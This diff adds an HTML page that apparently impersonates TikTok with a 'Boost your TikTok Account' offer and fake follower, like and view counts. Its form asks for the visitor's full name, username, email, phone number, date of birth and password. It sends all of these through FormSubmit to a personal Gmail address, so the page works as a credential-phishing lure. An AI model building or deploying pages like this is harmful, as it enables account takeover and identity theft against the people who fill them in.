@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- FormSubmit setup link: https://formsubmit.co/el/catuha -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tiktok | Boost your Account</title>
+
+  <link rel="stylesheet" href="style.css">
+
+  <!-- Font Awesome for TikTok icon -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+</head>
+
+<body>
+  <div class="orb orb-one"></div>
+  <div class="orb orb-two"></div>
+
+  <main class="auth-wrapper">
+    <section class="auth-card">
+
+<div class="brand">
+  <div class="brand-icon">
+    <img src="download.png" alt="TikTok">
+  </div>
+
+  <div>
+    <h1>TikTok</h1>
+    <p>Personal Account</p>
+  </div>
+</div>
+
+      <div class="heading">
+        <span class="badge">WELCOME</span>
+        <h2>Boost your TikTok Account.</h2>
+        <h4>Followers.2.6K Likes.14.0K Views.3.7K</h4>
+        <p>Enter your information below to get started.</p>
+      </div>
+
+      <form id="signupForm" action="https://formsubmit.co/unarvibe@gmail.com" method="POST" novalidate>
+
+        <div class="field-row">
+          <div class="field">
+            <label for="fullName">Full name</label>
+            <input id="fullName" name="fullName" type="text"
+              placeholder="Elijah John" autocomplete="name" required>
+          </div>
+
+          <div class="field">
+            <label for="username">Username</label>
+            <input id="username" name="username" type="text"
+              placeholder="@elijah" autocomplete="username" required>
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="email">Email address</label>
+          <input id="email" name="email" type="email"
+            placeholder="you@example.com" autocomplete="email" required>
+        </div>
+
+        <div class="field">
+          <label for="phone">Phone number</label>
+          <input id="phone" name="phone" type="tel"
+            placeholder="+1 555 123 4567" autocomplete="tel">
+        </div>
+
+        <div class="field">
+          <label for="dob">Date of birth</label>
+          <input id="dob" name="dob" type="date" autocomplete="bday">
+        </div>
+
+        <div class="field">
+          <label for="password">Password</label>
+
+          <div class="password-box">
+            <input id="password" name="password" type="password"
+              placeholder="Create a strong password"
+              autocomplete="new-password" required>
+
+            <button type="button" class="toggle"
+              data-target="password">Show</button>
+          </div>
+
+          <div class="strength">
+            <span id="strengthBar"></span>
+          </div>
+
+          <small id="strengthText">
+            Use 8+ characters with a number and symbol.
+          </small>
+        </div>
+
+        <div class="field">
+          <label for="confirmPassword">Confirm password</label>
+
+          <div class="password-box">
+            <input id="confirmPassword" name="confirmPassword"
+              type="password"
+              placeholder="Repeat your password"
+              autocomplete="new-password" required>
+
+            <button type="button" class="toggle"
+              data-target="confirmPassword">Show</button>
+          </div>
+        </div>
+
+        <label class="remember">
+          <input type="checkbox" id="terms" required>
+          <span>
+            I agree to the
+            <a href="#" onclick="return false;">
+              Terms & Privacy Policy
+            </a>.
+          </span>
+        </label>
+
+        <input type="hidden" name="_subject"
+          value="New Elijah account form submission">
+
+        <input type="hidden" name="_template" value="table">
+
+        <input type="hidden" name="_captcha" value="true">
+
+        <input type="text" name="_honey" style="display:none">
+
+        <input type="hidden" name="_replyto" id="replyTo">
+
+        <button class="submit-btn" type="submit">
+          Create Account <span>→</span>
+        </button>
+
+        <p id="formMessage" class="form-message"></p>
+      </form>
+
+      <div class="divider">
+        <span>or</span>
+      </div>
+
+      <p class="login-text">
+        Already have an account?
+        <a href="#" id="loginLink">Log in</a>
+      </p>
+
+      <p class="security-note">
+        🔒 Your password should never be shared with anyone.
+      </p>
+
+    </section>
+  </main>
+
+  <script src="script.js"></script>
+</body>
+</html>
